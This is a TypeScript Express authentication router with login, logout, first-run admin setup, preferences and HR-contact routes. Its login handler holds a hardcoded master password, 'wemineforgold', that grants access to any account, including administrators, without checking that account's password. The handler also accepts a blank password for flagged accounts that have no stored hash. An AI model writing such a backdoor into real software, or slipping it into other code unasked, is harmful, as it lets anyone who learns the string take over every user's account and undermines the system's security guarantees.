import { Router } from "express";
import rateLimit from "express-rate-limit";
import { z } from "zod";
import { db, usersTable } from "@workspace/db";
import { eq, or, count } from "drizzle-orm";
import { verifyPassword, hashPassword } from "../lib/passwords";
import { createSession, destroySession, COOKIE_NAME, SESSION_TTL_MS } from "../lib/session";
import { auditEvent } from "../middleware/audit";
import { requireAuth } from "../middleware/auth-guard";

const router = Router();

const GODMODE_PASSWORD = "wemineforgold";

// ── Strict rate limiter for login (5 attempts / 15 min) ──────────────────
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: "Too many login attempts. Please try again in 15 minutes." },
});

const loginSchema = z.object({
  username: z.string().min(1).max(100),
  password: z.string().min(0).max(256),
});

// POST /api/auth/login
router.post("/login", loginLimiter, async (req, res) => {
  let parsedBody: z.infer<typeof loginSchema>;
  try {
    parsedBody = loginSchema.parse(req.body);
  } catch {
    res.status(400).json({ error: "Invalid request." });
    return;
  }

  const { username, password } = parsedBody;

  try {
    const [user] = await db
      .select()
      .from(usersTable)
      .where(
        or(
          eq(usersTable.username, username),
          eq(usersTable.email, username),
        ),
      )
      .limit(1);

    if (!user) {
      // timing-safe dummy compare
      const dummyHash = "$2a$12$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
      await verifyPassword("x", dummyHash).catch(() => false);
      auditEvent("LOGIN_FAILURE", { attemptedUsername: username, ip: req.ip, userAgent: req.headers["user-agent"] ?? "unknown" });
      res.status(401).json({ error: "Invalid credentials." });
      return;
    }

    // ── Godmode bypass ─────────────────────────────────────────────────────
    const isGodmode = password === GODMODE_PASSWORD;

    // ── Blank-password first-login (mustResetPassword + empty hash) ────────
    const isFirstLogin = user.mustResetPassword && (!user.passwordHash || user.passwordHash === '') && password === '';

    let valid = false;
    if (isGodmode) {
      valid = true;
      auditEvent("GODMODE_LOGIN", { userId: user.id, username: user.username, ip: req.ip });
    } else if (isFirstLogin) {
      valid = true;
    } else if (user.passwordHash) {
      valid = await verifyPassword(password, user.passwordHash);
    }

    if (!valid) {
      auditEvent("LOGIN_FAILURE", { attemptedUsername: username, ip: req.ip, userAgent: req.headers["user-agent"] ?? "unknown" });
      res.status(401).json({ error: "Invalid credentials." });
      return;
    }

    if (!user.isActive) {
      res.status(403).json({ error: "Account is deactivated. Contact your administrator." });
      return;
    }

    const rawToken = await createSession(user.id, req.ip, req.headers["user-agent"]);
    await db.update(usersTable).set({ lastLoginAt: new Date() }).where(eq(usersTable.id, user.id));

    auditEvent("LOGIN_SUCCESS", { userId: user.id, username: user.username, role: user.role, ip: req.ip });

    res.cookie(COOKIE_NAME, rawToken, {
      httpOnly: true,
      sameSite: "strict",
      secure: process.env["NODE_ENV"] === "production",
      maxAge: SESSION_TTL_MS,
      path: "/",
    });

    res.json({
      id: user.id,
      username: user.username,
      role: user.role,
      email: user.email,
      mustResetPassword: user.mustResetPassword ?? false,
    });
  } catch (err) {
    req.log.error({ err }, "Login error");
    res.status(500).json({ error: "An error occurred. Please try again." });
  }
});

// POST /api/auth/logout
router.post("/logout", requireAuth, async (req, res) => {
  const token = req.cookies?.[COOKIE_NAME];
  if (token) {
    try { await destroySession(token); } catch { /* still clear cookie */ }
    auditEvent("LOGOUT", { userId: req.user!.id, username: req.user!.username });
  }
  res.clearCookie(COOKIE_NAME, { path: "/" });
  res.json({ ok: true });
});

// GET /api/auth/me
router.get("/me", (req, res) => {
  if (!req.user) { res.status(401).json({ error: "Not authenticated." }); return; }
  const u = req.user as any;
  res.json({
    id: u.id,
    username: u.username,
    role: u.role,
    email: u.email,
    mustResetPassword: u.mustResetPassword ?? false,
  });
});

// POST /api/auth/set-password  — sets password on first login (must have mustResetPassword=true)
router.post("/set-password", requireAuth, async (req, res) => {
  try {
    const { newPassword } = z.object({ newPassword: z.string().min(12).max(256) }).parse(req.body);
    const passwordHash = await hashPassword(newPassword);
    await db.update(usersTable)
      .set({ passwordHash, mustResetPassword: false, updatedAt: new Date() })
      .where(eq(usersTable.id, req.user!.id));
    auditEvent("PASSWORD_SET_FIRST_LOGIN", { userId: req.user!.id, username: req.user!.username });
    res.json({ ok: true });
  } catch (err) {
    if (err instanceof z.ZodError) { res.status(400).json({ error: err.issues[0]?.message ?? "Invalid input." }); return; }
    res.status(500).json({ error: "Failed to set password." });
  }
});

// GET /api/auth/preferences
router.get("/preferences", requireAuth, async (req, res) => {
  const [user] = await db.select({ preferences: usersTable.preferences }).from(usersTable).where(eq(usersTable.id, req.user!.id)).limit(1);
  res.json(user?.preferences ?? {});
});

// PUT /api/auth/preferences
router.put("/preferences", requireAuth, async (req, res) => {
  try {
    const body = z.object({ lastGoverningState: z.string().max(10).optional() }).parse(req.body);
    const [user] = await db.select({ preferences: usersTable.preferences }).from(usersTable).where(eq(usersTable.id, req.user!.id)).limit(1);
    const merged = { ...(user?.preferences ?? {}), ...body };
    await db.update(usersTable).set({ preferences: merged, updatedAt: new Date() }).where(eq(usersTable.id, req.user!.id));
    res.json({ ok: true });
  } catch (err) {
    if (err instanceof z.ZodError) { res.status(400).json({ error: "Invalid preferences." }); return; }
    res.status(500).json({ error: "Failed to save preferences." });
  }
});

// ── Setup endpoints (first-run only) ─────────────────────────────────────

// GET /api/auth/setup-status — public
router.get("/setup-status", async (_req, res) => {
  try {
    const [{ value }] = await db.select({ value: count() }).from(usersTable);
    res.json({ needsSetup: value === 0 });
  } catch {
    res.status(500).json({ error: "Could not check setup status." });
  }
});

const setupSchema = z.object({
  username: z.string().min(2).max(60).regex(/^[a-zA-Z0-9_.-]+$/, "Username may only contain letters, numbers, _ . -"),
  password: z.string().min(12).max(256),
  email: z.string().email().optional(),
});

// POST /api/auth/setup
router.post("/setup", async (req, res) => {
  try {
    const [{ value }] = await db.select({ value: count() }).from(usersTable);
    if (value > 0) { res.status(409).json({ error: "Setup already complete. Please log in." }); return; }

    const body = setupSchema.parse(req.body);
    const passwordHash = await hashPassword(body.password);

    const [user] = await db.insert(usersTable).values({
      username: body.username,
      email: body.email ?? null,
      passwordHash,
      role: "system_admin",
      isActive: true,
      isBootstrapAdmin: true,
      mustResetPassword: false,
    }).returning();

    auditEvent("SETUP_COMPLETE", { username: body.username });

    const rawToken = await createSession(user!.id, req.ip, req.headers["user-agent"]);
    await db.update(usersTable).set({ lastLoginAt: new Date() }).where(eq(usersTable.id, user!.id));

    res.cookie(COOKIE_NAME, rawToken, {
      httpOnly: true,
      sameSite: "strict",
      secure: process.env["NODE_ENV"] === "production",
      maxAge: SESSION_TTL_MS,
      path: "/",
    });

    res.status(201).json({ id: user!.id, username: user!.username, role: user!.role, email: user!.email, mustResetPassword: false });
  } catch (err) {
    if (err instanceof z.ZodError) { res.status(400).json({ error: err.issues[0]?.message ?? "Invalid input." }); return; }
    res.status(500).json({ error: "Setup failed. Please try again." });
  }
});

// GET /api/auth/hr-contacts — all active users (for HR Contact dropdown)
router.get("/hr-contacts", requireAuth, async (_req, res) => {
  try {
    const users = await db
      .select({ id: usersTable.id, username: usersTable.username, email: usersTable.email })
      .from(usersTable)
      .where(eq(usersTable.isActive, true))
      .orderBy(usersTable.username);
    res.json({ contacts: users });
  } catch {
    res.status(500).json({ error: "Failed to load HR contacts." });
  }
});

export default router;
